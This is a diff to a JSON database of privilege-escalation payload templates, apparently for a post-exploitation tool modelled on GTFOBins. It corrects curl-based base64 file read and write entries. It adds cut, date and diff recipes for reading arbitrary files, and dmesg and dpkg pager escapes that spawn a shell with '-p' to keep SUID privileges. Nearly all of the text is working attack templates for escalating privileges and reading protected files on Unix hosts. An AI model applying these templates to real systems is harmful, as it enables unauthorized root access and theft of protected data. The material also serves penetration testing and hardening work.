@@ -110,7 +110,7 @@
 		},
 		{
 			"type": "read",
-			"stream": "print",
+			"stream": "raw",
 			"payload": "{command} -c '{cat} {lfile}'",
 			"suid": ["-p"],
 			"exit": "{ctrl_d}"
@@ -465,8 +465,8 @@
 		{
 			"type": "read",
 			"stream": "base64",
-			"payload": "{command}",
-			"args": ["-s", "file://{lfile} --output - | {base64} -w 0"]
+			"payload": "{command} | {base64} -w 0",
+			"args": ["-s", "file://{lfile} --output -"]
 		},
 		{
 			"type": "write",
@@ -485,8 +485,63 @@
 			"type": "write",
 			"stream": "base64",
 			"payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF",
-			"args": ["-s", "file://$TF --output {lfile}"],
+			"args": ["-s", "file://$TF", "--output", "{lfile}"],
 			"exit": "{ctrl_d}"
 		}
+	],
+//-------------------------------------------------------------------
+	"cut": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-d", "''", "-f1", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"date": [
+		{
+			// This is a janky reader that relies on cut to fully carve out the output.
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} | {cut} -d \":\" -f2- | while read line; do echo ${{line:14:-1}}; done",
+			"args": ["-f", "{lfile}", "+\"%M%M%M%M%M%M\"", "2>&1"]
+		}
+	],
+//-------------------------------------------------------------------
+	"diff": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["--line-format=%L", "/dev/null", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"dmesg": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-H"],
+			"input": "!{shell} -p\n",
+			"exit": "exit\nq\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-rF", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"dpkg": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-l"],
+			"input": "!{shell} -p\n",
+			"exit": "exit\nq\n"
+		}
 	]
+
 }
